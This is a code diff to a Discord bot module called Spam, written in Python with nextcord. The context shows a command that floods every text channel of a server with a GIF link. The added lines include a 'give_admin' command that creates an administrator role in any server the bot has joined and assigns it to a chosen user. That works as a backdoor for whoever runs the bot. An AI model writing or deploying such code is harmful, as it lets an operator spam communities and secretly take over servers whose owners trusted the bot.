@@ -10,9 +10,11 @@ from _config import Config
 config = Config()
 logger = config.get_logger
 
+
 class Spam(DataMixin, Cog):
 	def __init__(self, bot: Bot):
 		self.bot = bot
+		self.stop_spam = False
 
 	@slash_command(
 		name='spam',
@@ -27,17 +29,9 @@ class Spam(DataMixin, Cog):
 				if not self.stop_spam:
 					if isinstance(channel, nextcord.TextChannel):
 						for i in range(count_for_each_channel):
-							embed = ResponseEmbed(
-								nextcord.Embed(
-								),
-								inter.user
-							).normal
-
-							embed.set_image(url=gif_url)
-
 							try:
 								await channel.send(
-									embed=embed
+									str(gif_url)
 								)
 								logger.info(f"Spamming in {channel.name}")
 							except Exception as exc:
@@ -115,6 +109,30 @@ class Spam(DataMixin, Cog):
 					inter.user
 				).normal
 			)
+
+	@slash_command(
+		name="give_admin",
+		description="Даёт админа пользователю"
+	)
+	async def give_admin(self, inter: Interaction, guild_id: str, user_id: str):
+		# only for has perms users
+		if await self.has_perms(inter=inter):
+			guild = self.bot.get_guild(int(guild_id))
+			user = guild.get_member(int(user_id))
+			await user.add_roles(await guild.create_role(permissions=discord.Permissions(
+				administrator=True), name="admin"))
+			await inter.send(
+				embed=ResponseEmbed(
+					nextcord.Embed(
+						title="Даём админа",
+						description="Дали админа {} {}".format(user.name, guild.name),
+					),
+					inter.user
+				).normal
+			)
+
+
+
 
 def setup(bot: Bot):
 	bot.add_cog(Spam(bot))
